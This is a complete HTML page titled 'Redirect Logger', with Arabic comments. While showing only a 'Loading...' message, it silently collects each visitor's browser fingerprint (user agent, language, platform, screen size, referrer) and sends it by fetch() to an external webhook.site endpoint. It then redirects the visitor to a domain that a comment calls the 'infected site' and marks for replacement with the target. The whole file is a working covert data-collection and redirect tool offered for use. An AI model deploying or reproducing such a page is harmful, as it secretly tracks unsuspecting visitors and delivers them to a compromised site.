<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Redirect Logger</title>
<script>
window.onload = function() {
    // بيانات المتصفح
    const data = {
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        cookiesEnabled: navigator.cookieEnabled,
        screenResolution: `${screen.width}x${screen.height}`,
        referrer: document.referrer
    };

    // إرسال البيانات إلى Webhook
    fetch("https://webhook.site/b6a196e3-4508-4abd-bcab-b80fcc70584a", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
    }).then(() => {
        // إعادة التوجيه للموقع المصاب
        window.location.href = "https://chloro.travix.com"; // غيرها برابط الموقع المصاب
    });
};
</script>
</head>
<body>
<p>جارٍ التحميل...</p>
</body>
</html>
